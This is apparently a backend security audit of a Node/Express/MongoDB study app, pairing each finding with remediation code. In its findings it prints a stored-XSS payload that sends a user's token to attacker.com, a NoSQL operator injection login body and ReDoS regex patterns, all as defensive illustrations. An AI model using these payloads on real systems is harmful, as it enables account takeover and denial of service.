# Backend Security Audit

**Date:** March 17, 2026 *(updated from March 7 — reflects new endpoints added since original audit)*
**Auditor:** Full codebase review — every controller, middleware, model, service, config, and route file
**Files audited:**
`server.js` · `auth.controller.js` · `notes.controller.js` · `tasks.controller.js` · `flashcardSets.controller.js`
`comments.controller.js` · `conversations.controller.js` · `messages.controller.js` · `applications.controller.js`
`resumes.controller.js` · `activity.controller.js` · `users.controller.js` · `calendar.controller.js`
`sync.controller.js` · `friends.controller.js` · `auth.middleware.js` · `upload.middleware.js`
`uploadImage.middleware.js` · `groq.service.js` · `activity.service.js` · `googleDrive.js`
`passport.js` · `User.js` · `Note.js` · `package.json` · `.env.example` · `.gitignore`

**New since March 7:**
`auth.routes.js` — added `POST /send-verification` (protected) and `GET /verify-email` (public)
`resumes.controller.js` — added `DELETE /resumes/:id` (soft-delete + Cloudinary cleanup)
`notes.controller.js` — added `POST /notes/upload` (PDF parse + Cloudinary), `GET /notes/:id/pdf`
`User.js` — added `emailVerificationToken` (select: false), `emailVerificationExpires`, `createEmailVerificationToken()`

**Purpose:** Identify every exploitable attack surface before real users are onboarded.
This is an MVP, but this backend is the permanent product foundation — security debt carried
forward now becomes a breach liability later.

---

## Executive Summary

The backend has strong cryptographic foundations: bcrypt password hashing, SHA-256 hashed
refresh tokens, ownership checks on all personal data endpoints, and no secrets in source
control. However, critical network-layer, input-handling, and API cost-abuse gaps exist that
are trivially exploitable without authentication. A motivated attacker can currently:

- Brute-force any user's password with no throttling
- Run up your Groq (or future OpenAI) bill to zero with a single script
- Crash the server on any route accepting an `:id` param by sending a non-ObjectId string
- Execute malicious regex patterns that freeze database query threads
- Access the comments on any private note by guessing its ID
- Send unsolicited messages to any user without a friendship requirement

These must be closed before any public access.

| Severity | Count |
|---|---|
| Critical | 4 |
| High | 6 |
| Medium | 8 |
| Low / Info | 5 |

---

## Section 1 — Authentication & Session Management

### C1 — No Rate Limiting on Auth Endpoints ✅ RESOLVED (March 17, 2026)

**Files:** `server.js`, `auth.controller.js`

Password brute-force and credential stuffing against login are completely unblocked.
An attacker with a list of 10,000 passwords can script requests against `POST /api/auth/login`
at thousands of attempts per minute. The same applies to the forgot-password endpoint — which
can be used to flood any real user's inbox with reset emails.

**Affected routes:**
- `POST /api/auth/login` — password brute force
- `POST /api/auth/forgot-password` — inbox flooding + email enumeration amplification
- `POST /api/auth/reset-password` — token space brute force (mitigated by token entropy, but still)
- `POST /api/auth/refresh` — token enumeration

**Fix:**

```bash
npm install express-rate-limit
```

```js
// middleware/rateLimiter.js
const rateLimit = require('express-rate-limit');

exports.authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    message: { success: false, error: 'Too many attempts. Try again in 15 minutes.' },
    standardHeaders: true,
    legacyHeaders: false,
});

exports.apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 300,
    message: { success: false, error: 'Too many requests.' },
    standardHeaders: true,
    legacyHeaders: false,
});
```

Apply `authLimiter` in `auth.routes.js` on `login`, `forgot-password`, `reset-password`,
and `refresh`. Apply `apiLimiter` globally in `server.js` before all routes.

---

### C2 — No HTTP Security Headers ✅ RESOLVED (March 17, 2026)

**File:** `server.js`

Every API response is sent without standard browser security headers. Missing headers:

- `X-Content-Type-Options: nosniff` — browsers can sniff MIME type and execute content
  as a different type than intended
- `X-Frame-Options: DENY` — the app can be embedded in a malicious iframe (clickjacking)
- `X-Powered-By: Express` — returned on every response, tells attackers the exact framework
  and version to target
- `Content-Security-Policy` — no restrictions on what the frontend can load or execute

**Fix:**

```bash
npm install helmet
```

```js
// server.js — add before all routes
const helmet = require('helmet');
app.use(helmet());
app.disable('x-powered-by'); // belt-and-suspenders alongside helmet
```

---

### C3 — JWT Passed in URL on Google OAuth Callback (Critical)

**File:** `auth.controller.js:178`

```js
res.redirect(`${process.env.FRONTEND_URL}/auth/callback?token=${token}`);
```

The 1-day JWT is sent as a URL query parameter. This means:
- It is permanently stored in every user's browser history
- It appears in `Referer` headers on the next outbound navigation
- It is written into server access logs, CDN logs, and any proxy between client and server
- A user who copies or shares the callback URL hands their full session to the recipient

**Fix:** Use a short-lived one-time code pattern:

```js
// After Google auth succeeds, generate a random code stored with 60s TTL
const code = crypto.randomBytes(16).toString('hex');
// Store: { codeHash: hash(code), userId, expiresAt: now + 60s } in DB or Redis
res.redirect(`${process.env.FRONTEND_URL}/auth/callback?code=${code}`);

// New endpoint: POST /api/auth/google/exchange (public)
// Validates the code is unexpired and single-use -> deletes it -> returns { token, refreshToken }
```

The token never touches a URL. This is a pre-launch requirement if Google OAuth is live.

---

### C4 — `googleLink` Trusts Client-Provided `googleId` (Critical)

**File:** `auth.controller.js:187-202`

```js
const { googleId, googleAccessToken, googleRefreshToken } = req.body;
// No server-side verification with Google — googleId is used directly
req.user.googleId = googleId;
```

Any authenticated user can link an arbitrary `googleId` to their own account. The server
never verifies the `googleId` with Google. An attacker who knows another user's Google ID
(a public numeric string often visible in Google profile URLs) can claim that identity,
blocking the real owner from ever linking their Google account.

**Fix:** Require a Google ID token from the client and verify it server-side:

```js
const { OAuth2Client } = require('google-auth-library');
const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);

const ticket = await client.verifyIdToken({
    idToken: req.body.idToken,  // Google-issued ID token, not a raw googleId
    audience: process.env.GOOGLE_CLIENT_ID,
});
const googleId = ticket.getPayload().sub; // use Google's value, never trust the client
```

---

### M1 — JWT Algorithm Not Explicitly Constrained ✅ RESOLVED (March 17, 2026)

**File:** `auth.middleware.js:24`

```js
decoded = jwt.verify(token, process.env.JWT_SECRET);
```

No `{ algorithms: ['HS256'] }` option is passed. In vulnerable versions of `jsonwebtoken`
(pre-9.x), an attacker could forge a token signed with `alg: none` and bypass signature
verification entirely. Current library versions mitigate this by default, but relying on
library defaults for cryptographic operations is unacceptable security practice.

**Fix:**

```js
// sign (auth.controller.js):
jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: '1d', algorithm: 'HS256' });

// verify (auth.middleware.js):
jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
```

---

### M2 — Google OAuth Username Collision Crashes Server ✅ RESOLVED (March 17, 2026)

**File:** `config/passport.js:68`

```js
const username = email.split('@')[0];
user = await User.create({ email, username, ... });
```

When a new user registers via Google, their username is derived from their email prefix.
Two users with the same prefix from different domains (e.g. `john@gmail.com` and
`john@outlook.com`) produce a MongoDB duplicate key error on the `username` field.
This error is not caught — it propagates as an unhandled exception, returning an HTML 500
to the OAuth callback and leaving the user with a permanently broken auth flow.

**Fix:**

```js
let username = email.split('@')[0].replace(/[^a-zA-Z0-9_]/g, '');
const exists = await User.findOne({ username });
if (exists) {
    username = `${username}_${crypto.randomBytes(3).toString('hex')}`;
}
```

---

## Section 2 — AI / LLM API Cost Abuse

This section covers attacks that do not steal data but destroy your budget. When you move
to a paid Groq plan or OpenAI, these vectors allow any authenticated user to run up
unlimited AI spend at your expense with a simple script.

### H1 — No Per-User Rate Limiting on AI Endpoints (High) — Partially Resolved

**Files:** `flashcardSets.controller.js:26`, `notes.controller.js:286`, `notes.controller.js:335`, `resumes.controller.js:102`

Four endpoints call the Groq API with no per-user call limits or cooldowns:

| Endpoint | Output tokens per call | Input cache? |
|---|---|---|
| `POST /api/flashcard-sets/generate` | ~2,500 | No |
| `POST /api/notes/:id/summary` | ~2,500 | Yes, bypassed with `?force=true` |
| `POST /api/notes/:id/flashcards/generate` | ~2,000 | No |
| `POST /api/resumes/:id/feedback` | ~3,500 | No — unlimited calls, each appends to array |

A single authenticated user can script these endpoints in a loop. On a paid plan, 1,000 calls
to `generateResumeFeedback` with a full resume could consume millions of tokens in minutes.
There is no check preventing a user from calling `POST /api/resumes/:id/feedback` 10,000 times
on the same resume — every call succeeds.

**Fix — implement all three layers:**

1. **Per-user per-day AI call limits** using a counter in cache or DB:

```js
// Check before any Groq call
const today = new Date().toISOString().split('T')[0];
const key = `ai:${userId}:${today}`;
const count = await redis.incr(key);
if (count === 1) await redis.expire(key, 86400);
if (count > 10) {
    return res.status(429).json({ success: false, error: 'Daily AI generation limit reached' });
}
```

2. **Content length cap before sending to Groq** — truncate input at a reasonable limit:

```js
// In groq.service.js, before building any prompt:
const MAX_INPUT = 50000; // ~50KB
content = content.slice(0, MAX_INPUT);
```

3. **Resume feedback cooldown** — prevent regeneration more than once per hour:

```js
const last = resume.feedback[resume.feedback.length - 1];
if (last && (Date.now() - new Date(last.generatedAt)) < 60 * 60 * 1000) {
    return res.status(429).json({ success: false, error: 'Wait 1 hour before regenerating feedback' });
}
```

4. **Set spend alerts and hard caps in your AI provider dashboard** before enabling any
   public access. Groq has a dashboard rate limit. OpenAI has `usage_limits`. Set alerts
   at $10, $50, and $100, and a hard monthly cap at your acceptable maximum spend.

---

### H2 — Note Content Has No Maximum Length ✅ RESOLVED (March 17, 2026)

**File:** `models/Note.js:34`

```js
content: { type: String }  // no maxlength
```

The note `content` field stores an unbounded string. A user can POST a 100MB string as note
content. This affects the entire AI pipeline — the full `content` is passed as a prompt in
both `generateSummary` and `generateFlashcardsFromNote`. A massive note fills the model's
entire context window, maximizing token cost per call. Combined with H1 (no rate limit),
a user can loop: upload large note -> call summary -> call flashcards -> repeat.

**Fix:**

```js
content: {
    type: String,
    maxlength: [200000, 'Note content cannot exceed 200,000 characters'],
},
```

200,000 characters is generous for any real note and also caps Groq input token usage.

---

## Section 3 — Input Validation & Injection Attacks

### H3 — ReDoS Vulnerability in Three Search Endpoints ✅ RESOLVED (March 17, 2026)

**Files:** `notes.controller.js:87`, `applications.controller.js:67`, `users.controller.js:23`

All three search endpoints pass user-controlled input directly to MongoDB's `$regex` operator
or `new RegExp()` without escaping:

```js
// notes.controller.js
filter.$or = [{ title: { $regex: search, $options: 'i' } }, { content: { $regex: search, $options: 'i' } }];

// applications.controller.js
const regex = new RegExp(search.trim(), 'i');

// users.controller.js
const regex = new RegExp(q.trim(), 'i');
```

An attacker sends a pathological pattern like `(a+)+b` or `(\w+\s?){50}`. MongoDB evaluates
this regex against every matching document. The regex engine backtracks catastrophically on
non-matching strings — one query can lock a database thread for 10+ seconds. Multiple
concurrent requests constitute a denial-of-service attack against the database itself.
Because note `content` has no maxlength (H2), the notes search is the most dangerous —
the longer the string, the longer the backtrack.

**Fix — escape all three:**

```js
const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

// notes:
const safe = escapeRegex(search.slice(0, 200));
// applications:
const safe = escapeRegex(search.trim().slice(0, 200));
// users:
const safe = escapeRegex(q.trim().slice(0, 100));
```

---

### H4 — No NoSQL Operator Injection Protection ✅ RESOLVED (March 17, 2026)

**File:** `server.js` — no sanitization middleware

No `mongo-sanitize` or equivalent is applied. An attacker can inject MongoDB operators into
any request body. The most direct attack targets login:

```json
POST /api/auth/login
{ "email": { "$gt": "" }, "password": "anything" }
```

This rewrites the query to `User.findOne({ email: { $gt: "" } })` — matching the first user
in the collection. Whether authentication is bypassed depends on Mongoose type casting, which
is not consistent across all code paths.

**Fix:**

```bash
npm install mongo-sanitize
```

```js
// server.js — after bodyParser, before routes
const mongoSanitize = require('mongo-sanitize');
app.use((req, _res, next) => {
    req.body   = mongoSanitize(req.body);
    req.params = mongoSanitize(req.params);
    req.query  = mongoSanitize(req.query);
    next();
});
```

---

### H5 — Invalid ObjectId Returns HTML 500 on 30+ Endpoints ✅ RESOLVED (March 17, 2026)

**Affected:** Every route with an `/:id` URL parameter

`GET /api/notes/not-a-valid-id` triggers `CastError: Cast to ObjectId failed`. Since no
controller uses `try/catch` and there is no global error handler, Express 5 catches this but
returns an HTML error page with a full stack trace in development — not JSON. API clients
cannot parse this, and the stack trace exposes internal file paths.

**Fix:**

```js
// server.js — after all routes, before app.listen
app.use((err, req, res, _next) => {
    if (err.name === 'CastError' && err.kind === 'ObjectId') {
        return res.status(400).json({ success: false, error: 'Invalid ID format' });
    }
    if (err.name === 'ValidationError') {
        return res.status(400).json({ success: false, error: err.message });
    }
    console.error(err);
    const message = process.env.NODE_ENV === 'production'
        ? 'Internal server error'
        : err.message;
    res.status(err.status || 500).json({ success: false, error: message });
});
```

Also wrap the `User.findById` call in `auth.middleware.js` in a try/catch and call `next(err)`
so DB connection failures are handled as JSON, not HTML.

---

### H6 — No Email Format Validation on Registration ✅ RESOLVED (March 17, 2026)

**File:** `models/User.js:19-25`

The `email` field has no regex validation — only `required`, `unique`, and `lowercase`.
A user can register with `"notanemail"`, `"x"`, or any string. Consequences:
- Forgot-password fires `resend.emails.send()` to an invalid address — Resend may throw
  an unhandled error returned as HTML 500
- Users can register accounts that can never receive password reset emails, permanently
  locking themselves out
- Username namespace polluted with throwaway registrations tied to invalid emails

**Fix:**

```js
email: {
    type: String,
    required: [true, 'Email is required'],
    unique: true,
    lowercase: true,
    trim: true,
    match: [/^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'Please provide a valid email address'],
},
```

---

### M3 — Stored XSS in HTML Note Content ✅ RESOLVED (March 17, 2026)

**Files:** `models/Note.js:36`, `notes.controller.js:50`

Notes support `contentType: 'html'`. The `content` field stores raw HTML with zero
sanitization. If the frontend renders note content using `innerHTML` or equivalent,
any user can store:

```html
<script>fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))</script>
```

For shared notes (visibility: friends/specific), this is a **stored XSS** attack.
One user stores the payload, another user views the note, their browser executes it.
The victim's JWT is accessible and is sent to the attacker — this is a full account
takeover vector against every user you share content with.

**Fix:**

```bash
npm install sanitize-html
```

```js
// In createNote and updateNote, before storing:
if (contentType === 'html' && content) {
    const sanitizeHtml = require('sanitize-html');
    content = sanitizeHtml(content, {
        allowedTags: sanitizeHtml.defaults.allowedTags,
        allowedAttributes: sanitizeHtml.defaults.allowedAttributes,
    });
}
```

This is a pre-launch requirement for any feature that renders user-provided HTML.

---

### M4 — Mass Assignment in Sync Endpoint ✅ RESOLVED (March 17, 2026)

**File:** `sync.controller.js — handlers object`

The sync endpoint spreads the raw client `data` payload directly into model create and
update calls:

```js
// notes handler
create: async (userId, _documentId, data) => Note.create({ ...data, userId }),
update: async (userId, documentId, data) => Note.findOneAndUpdate(..., data, ...),
```

A client can set any field on the model: `visibility: 'friends'`, `sharedWith: ['<userId>']`,
`deletedAt: new Date()`, `hasFlashcards: true`, or even `_id: <specificId>`. The `visibility`
injection bypasses the `shareNote` endpoint's friend-validation logic entirely — a user can
create a note shared with strangers through the sync path.

**Fix:** Whitelist allowed fields explicitly in each handler:

```js
create: async (userId, _documentId, data) => {
    const { title, content, contentType, tags, subject, folder } = data;
    return Note.create({ title, content, contentType, tags, subject, folder, userId });
},
update: async (userId, documentId, data) => {
    const { title, content, contentType, tags, subject, folder, isPinned } = data;
    return Note.findOneAndUpdate(
        { _id: documentId, userId, deletedAt: null },
        { title, content, contentType, tags, subject, folder, isPinned },
        { new: true, runValidators: true }
    );
},
```

---

## Section 4 — Authorization & Access Control

### M5 — Comments Accessible Without Target Access Check ✅ RESOLVED (March 17, 2026)

**File:** `comments.controller.js:73-92`

```js
exports.getComments = async (req, res) => {
    const { targetType, targetId } = req.params;
    const comments = await Comment.find({ targetType, targetId, deletedAt: null });
    // No check that req.user has permission to view the target
```

Any authenticated user can read all comments on any note, flashcard set, or task by supplying
its ID — even if the target is private and owned by a complete stranger. Comments contain
user snapshots (name, username) and discussion content. If a private note's ObjectId is
discovered through enumeration or a data leak, its entire comment thread is exposed.

**Fix:** Verify requester access to the target before returning comments:
- For notes: check ownership OR that the note is shared with the requester
- For flashcard sets: check ownership OR that the set is shared with the requester
- For tasks: check ownership OR that the requester is a participant

---

### M6 — Any User Can Message Any Other User ✅ RESOLVED (March 17, 2026)

**File:** `conversations.controller.js:19-55`

`startConversation` opens a 1-on-1 DM between any two users with zero friendship
requirement. A bad actor can send unsolicited messages to any user on the platform —
enabling harassment, spam, and social engineering through the in-app messaging system.

**Fix:**

```js
const { user1, user2 } = sortedPair(userId, participantId);
const friendship = await Friendship.findOne({ user1, user2, status: 'accepted', deletedAt: null });
if (!friendship) {
    return res.status(403).json({ success: false, error: 'You can only message accepted friends' });
}
```

---

### M7 — Task Participants Not Validated as Friends ✅ RESOLVED (March 17, 2026)

**File:** `tasks.controller.js:51-53`

Participant userIds are accepted without verifying existence or friendship:

```js
participants.map((p) => ({ userId: p.userId, status: 'todo' }))
```

Any userId — including strangers and fabricated ObjectIds — can be added as a task
participant. Those users then see the task in their shared feed, exposing task title,
due date, and metadata to people who never consented to it.

**Fix:** Validate all participant IDs against the creator's accepted friend list before
creating the task, using the same pattern already implemented in `shareNote` and `shareSet`.

---

## Section 5 — Sensitive Data Exposure

### M8 — Google OAuth Tokens Stored in Plaintext (Medium)

**Files:** `models/User.js:78-88`, `config/googleDrive.js`, `config/passport.js`

`googleAccessToken` and `googleRefreshToken` are stored as plaintext strings in MongoDB.
`select: false` prevents accidental API exposure but the raw values sit in the database.
A compromised DB backup, Atlas misconfiguration, or internal access gives an attacker
every user's Google Drive access token — granting read access to all of their Drive files.

`googleDrive.js` also writes refreshed access tokens back to the DB in plaintext.

**Fix options:**
1. **Encrypt at rest** — AES-256-GCM with a `GOOGLE_TOKEN_ENCRYPTION_KEY` env var before
   storing; decrypt on read. Never store the encryption key in the DB.
2. **Store only the refresh token** — derive the access token on demand at runtime.

For MVP: `select: false` is an acceptable short-term mitigation. Track as a pre-launch item.

---

### L1 — No Email Verification Flow ✅ RESOLVED (March 17, 2026)

**File:** `models/User.js`, `auth.controller.js`, `auth.routes.js`

**What was implemented:**
- `User.js` — added `emailVerificationToken` (`select: false`, SHA-256 hashed), `emailVerificationExpires` (24h TTL), and `createEmailVerificationToken()` method (same pattern as `createPasswordResetToken`)
- `POST /api/auth/send-verification` (protected) — generates token, stores hash via `findByIdAndUpdate`, sends email via Resend
- `GET /api/auth/verify-email?token=` (public) — hashes token, queries DB, uses `findByIdAndUpdate` to atomically write `emailVerified: true` and `$unset` both token fields
- Auto-send on registration (non-blocking try/catch — registration succeeds even if email fails)
- Google OAuth — all three Passport.js cases (`existing Google user`, `link existing email`, `new user`) now set `emailVerified: true` since Google has already verified the email
- Frontend `EmailVerified.jsx` — `useRef` guard prevents React 18 StrictMode double-fire from consuming the one-time token twice

**Security note preserved:** Password resets for unverified accounts are not yet blocked. Track as a future hardening item.

---

### L2 — PDF Parsing of Untrusted User Content (Low)

**File:** `resumes.controller.js:52-55`

`pdf-parse` processes raw PDF binary data from user uploads. The MIME type check restricts
to `application/pdf`, but MIME types are client-declared and cannot be trusted — a crafted
binary with a PDF header can pass the check while containing a malicious payload. If
`pdf-parse` has an unpatched vulnerability, a crafted PDF could crash the process or
cause memory corruption.

**Fix:**
- Keep `pdf-parse` updated. Run `npm audit` on every deploy.
- Validate the PDF magic bytes server-side (`%PDF-` at byte offset 0) independent of
  the MIME type header.
- Consider running PDF parsing in a sandboxed child process to isolate any crash.

---

## Section 6 — Security Misconfiguration

### L3 — No Global Async Error Handler ✅ RESOLVED (March 17, 2026)

**File:** `server.js`

No `app.use((err, req, res, next) => { ... })` is registered. Any unhandled async exception
(Mongoose CastError, DB connection failure, Resend timeout, Groq API error) falls through to
Express 5's default handler — HTML with a full stack trace in development. API clients cannot
parse this. Stack traces expose internal file paths and implementation details.

Fix is described in H5 — add the global error handler as the last middleware in `server.js`.

---

### L4 — JSON Body Size Limit Not Explicit ✅ RESOLVED (March 17, 2026)

**File:** `server.js:19`

```js
app.use(bodyParser.json());
```

`body-parser`'s default JSON limit is 100KB. Acceptable, but should not rely on defaults:

```js
app.use(bodyParser.json({ limit: '50kb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50kb' }));
```

---

### L5 — CORS Allows All HTTP Methods ✅ RESOLVED (March 17, 2026)

**File:** `server.js:15-18`

Origin is correctly scoped, but all methods are implicitly allowed. Explicitly restrict:

```js
app.use(cors({
    origin: process.env.FRONTEND_URL || 'http://localhost:3000',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

---

## Section 7 — What Is Done Well

These patterns are correct and must be preserved as the codebase grows.

- **Password hashing:** bcrypt with `saltRounds: 12`. Pre-save hook fires only when `password`
  is modified. `select: false` — never returned by any query.
- **Generic auth error messages:** Login returns "Invalid credentials" for both unknown email
  and wrong password. Forgot-password always returns 200 regardless of email existence.
  Neither endpoint reveals whether an account exists.
- **Password reset is single-use:** `passwordResetToken` and `passwordResetExpires` are
  cleared immediately after a successful reset — the link cannot be replayed.
- **Refresh token architecture:** `crypto.randomBytes(40)` raw token, SHA-256 hash stored in
  DB, raw returned to client once and never stored. Per-device revocation and revoke-all both
  implemented and tested.
- **MIME type allowlists on uploads:** PDF-only for resumes. JPEG/PNG/WebP-only for avatars.
  10MB hard limit. `multer` `memoryStorage` prevents writing to disk.
- **CORS origin scoped to `FRONTEND_URL`:** Not `*`.
- **Secrets in `.env`, gitignored:** `.env.example` contains only placeholders. No credentials
  committed to source control.
- **Ownership enforced on all personal data endpoints:** All controllers scope queries to
  `req.user._id`. No cross-user data access through standard CRUD endpoints.
- **Soft-delete + unique index races fixed (March 2026):** Friendship reactivation and
  `googleDocId` clearing on note delete handled correctly.
- **Google lockout prevention:** `googleUnlink` blocks users with no password from unlinking.
- **`updateProfile` uses an explicit field whitelist:** Only `firstName`, `lastName`, `bio`,
  and specific settings keys accepted — no other User fields can be overwritten through this endpoint.
- **Inbox preview truncated at 200 chars:** `conversations.controller.js` caps `lastMessage.content`
  — unbounded message content cannot corrupt the inbox.
- **Activity feed respects privacy settings:** `activity.service.js` checks `activityVisibility`
  before creating any feed entry — private users are never exposed in the feed.
- **AI summary is cached:** Note summary is not re-generated unless `?force=true` is explicitly
  passed — reduces unnecessary token consumption under normal use.
- **Email verification tokens are single-use:** `findByIdAndUpdate` atomically sets `emailVerified: true` and `$unset`s both token fields in one operation — replaying the same link returns 400.
- **`deleteResume` uses non-blocking Cloudinary cleanup:** Cloudinary deletion is wrapped in try/catch so a CDN failure never blocks the soft-delete response — the document is marked deleted regardless.
- **PDF upload uses `multer` memoryStorage:** Same pattern as resume upload — file never touches disk, validated by MIME type and file extension before Cloudinary upload.
- **Message pagination is capped:** `getMessages` caps `limit` at 100 with `Math.min`.
- **Activity feed pagination is capped:** `getActivityFeed` caps `limit` at 50 with `Math.min`.

---

## Section 8 — Infrastructure Security

These items live outside the application code. They are the most common vector for real-world
data breaches — misconfigured cloud infrastructure causes more incidents than application bugs.

### I1 — MongoDB Atlas Network Access (Must Do Before Any Public Traffic)

**How it works:** Atlas rejects all TCP connections from IPs not on your Network Access list.
Your app server's IP is the only one that should ever be on it. `0.0.0.0/0` (allow all)
must never be present in a production environment — it exposes your entire database to the
internet regardless of how strong your application-layer security is.

**Current state:** You have removed `0.0.0.0/0` and replaced it with specific IPs.
Verify this in Atlas → your cluster → **Network Access** tab.

**Production problem — static IP requirement:**
Most hosting providers (Railway, Render, Heroku) do not give you a static IP on starter
plans. Your server gets a new IP on every deploy or restart, which would break the allowlist.

**Fix options (pick one when you choose a hosting provider):**
- **Static IP add-on** — Railway and Render both offer this on paid plans. Add the static
  IP to your Atlas allowlist. This is the cleanest solution.
- **Quotaguard Static** — a proxy service that routes your outbound DB traffic through a
  fixed IP. Works on any hosting provider.
- **Self-hosted VPS** (DigitalOcean Droplet, Fly.io Machine) — you own and control the
  server IP directly.

**Action:** Come back to this once you choose a hosting provider. Do not launch without
a static IP locked to Atlas.

---

### I2 — HTTPS / TLS End-to-End (Automatically Handled by Major Hosts)

**Why it matters:** Without HTTPS, every JWT your users send is transmitted in plaintext
over the network. Any network observer (ISP, coffee shop router, proxy) can read and replay
session tokens.

**How to check:** After deploying, verify your API base URL starts with `https://` and a
browser padlock appears. You can also run:

```bash
curl -I https://your-api-domain.com/health
```

If it returns a 200 with response headers, TLS is working.

**Hosting providers that handle TLS automatically (zero configuration):**
- Railway — auto-provisions a TLS cert for `*.up.railway.app` and custom domains
- Render — same, for `*.onrender.com` and custom domains
- Heroku — same, for `*.herokuapp.com` and custom domains

**Action:** Deploy to one of the above. HTTPS is free and automatic. Verify the padlock
after first deploy. No code changes needed in the backend.

---

### I3 — Environment Variables Scoped Correctly in Hosting Platform

**What to verify after deploying:**
- All 8 secrets from `.env.example` are set in your hosting provider's environment variable
  dashboard — never in the codebase
- `NODE_ENV=production` is set — this suppresses stack traces in error responses and
  enables production behavior in Express and Mongoose
- No env vars are exposed in build logs or public configuration files
- Team member access to env vars is restricted to those who actually need them

---

## Section 9 — Monitoring & Incident Response

Without monitoring, you will not know you are being attacked until after the damage is done.
A user could be hammering your login endpoint overnight, draining your Groq balance, or
accessing data abnormally — and you would have no visibility.

### MO1 — Spend Alerts on All Paid External Services (Do This Now)

Set billing alerts before any real usage occurs. This takes 15 minutes total.

| Service | Where | Recommended alert thresholds |
|---|---|---|
| Groq | groq.com → Settings → Billing | $10, $50, monthly hard cap |
| OpenAI (future) | platform.openai.com → Billing | $10, $50, monthly hard cap |
| MongoDB Atlas | Atlas → Billing → Alerts | Alert on data transfer spike |
| Cloudinary | cloudinary.com → Billing | Alert at 70% of plan limit |
| Resend | resend.com → Billing | Alert at 70% of plan limit |

Groq and OpenAI both support hard monthly spend caps — set these before enabling any
public-facing AI features.

---

### MO2 — Application-Level Logging (Add Before Beta)

Your app currently logs nothing meaningful. When something goes wrong — a breach, abuse,
or unexpected behavior — you will have no trail to investigate. Add structured logging at
minimum for auth failures and AI usage before any real users are onboarded.

**Minimum viable logging to add:**

```js
// auth.controller.js — inside the login "Invalid credentials" path:
console.warn(JSON.stringify({
    event: 'auth_failure',
    email,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
}));
```

```js
// groq.service.js — before each Groq API call:
console.info(JSON.stringify({
    event: 'ai_call',
    fn: 'generateSummary', // or generateFlashcards, generateResumeFeedback
    userId,
    contentLength: content.length,
    timestamp: new Date().toISOString(),
}));
```

Use your hosting provider's built-in log viewer (Railway, Render, and Heroku all have one)
to search these logs. You do not need a third-party logging service at MVP stage.

**What to watch for:**
- Multiple `auth_failure` events from the same IP within a short window — password spray attack
- `ai_call` events from a single userId at high frequency — cost abuse
- Any 500-level responses in your server logs — indicates unhandled errors in production

---

## Section 10 — Ongoing Security Practices

Security is not a one-time checklist. These practices must be maintained continuously.

### OP1 — Run `npm audit` on Every Deploy

Every package you install can develop known vulnerabilities after you ship. `npm audit`
scans your dependency tree against the Node.js security advisory database and reports
anything with a CVE.

```bash
npm audit
```

Run this before every production deploy. If it reports high or critical vulnerabilities,
investigate before shipping. Add this to your deployment checklist.

---

### OP2 — Rotate API Keys Periodically and After Any Team Member Leaves

Keys that never rotate are keys that accumulate exposure risk over time. Establish a
rotation schedule and enforce it:

| Key | Rotation frequency |
|---|---|
| `JWT_SECRET` | Every 6 months, or immediately after any suspected exposure |
| `GROQ_API_KEY` | Every 6 months, or if spend anomalies are detected |
| `CLOUDINARY_API_KEY` / `API_SECRET` | Quarterly |
| `RESEND_API_KEY` | Quarterly |
| `GOOGLE_CLIENT_SECRET` | Annually, or after any team member leaves |
| `MONGODB_URI` (connection string password) | Annually |

When rotating a key: update the value in your hosting provider's env dashboard, redeploy,
confirm the app is working, then revoke the old key in the provider's dashboard.

---

### OP3 — GDPR / Data Privacy (Required if Any Users Are in the EU)

If users in the European Union sign up, GDPR applies from day one — not after you scale.
The key requirements that affect this backend:

- **Right to erasure ("right to be forgotten"):** Soft deletes alone do not satisfy this.
  You need a hard delete path that permanently removes the user's account and all associated
  data (notes, tasks, flashcard sets, messages, activity, etc.) from MongoDB. The
  `emailVerified: false` state also means you cannot confirm the registrant actually consented.
- **Data portability:** Users must be able to export all data you hold about them in a
  machine-readable format.
- **Privacy policy:** Must be in place before any EU users can sign up.

**Action:** If you plan to have EU users at launch, add a hard delete endpoint and a
privacy policy before opening registration. If US-only initially, track this as a
pre-EU-expansion item.

---

## Section 11 — Remediation Roadmap

All findings consolidated. Work through this list top to bottom to reach a launch-ready
security posture.

| # | Finding | Effort | Must do before |
|---|---|---|---|
| 1 | ~~Install `helmet` — HTTP security headers (C2)~~ ✅ March 17, 2026 | — | — |
| 2 | ~~Rate limiting on auth routes — `express-rate-limit` (C1)~~ ✅ March 17, 2026 | — | — |
| 3 | ~~Global API rate limit in `server.js` (C1)~~ ✅ March 17, 2026 | — | — |
| 4 | ~~Install `mongo-sanitize` — operator injection (H4)~~ ✅ March 17, 2026 | — | — |
| 5 | ~~Global async error handler + JSON error responses (H5, L3)~~ ✅ March 17, 2026 | — | — |
| 6 | ~~Escape `$regex` input in notes, applications, users search (H3)~~ ✅ March 17, 2026 | — | — |
| 7 | ~~Add email format validation to User schema (H6)~~ ✅ March 17, 2026 | — | — |
| 8 | ~~Add `maxlength` to note `content` field (H2)~~ ✅ March 17, 2026 | — | — |
| 9 | Set spend alerts on Groq, Atlas, Cloudinary, Resend (MO1) | 15 min | Any public traffic |
| 10 | Per-user AI call rate limiting — Redis counter (H1) | 2–3 hrs | Any paid AI plan |
| 11 | ~~Content length cap before every Groq call (H1)~~ ✅ March 17, 2026 | — | — |
| 12 | ~~Resume feedback cooldown (H1)~~ ✅ March 17, 2026 | — | — |
| 13 | Set hard spend cap in Groq/OpenAI dashboard (H1) | 10 min | Any paid AI plan |
| 14 | ~~Explicit JWT algorithm in sign + verify (M1)~~ ✅ March 17, 2026 | — | — |
| 15 | Set `NODE_ENV=production` in hosting platform (I3) | 5 min | First deploy |
| 16 | ~~Restrict CORS methods explicitly (L5)~~ ✅ March 17, 2026 | — | — |
| 17 | ~~Explicit JSON body size limit (L4)~~ ✅ March 17, 2026 | — | — |
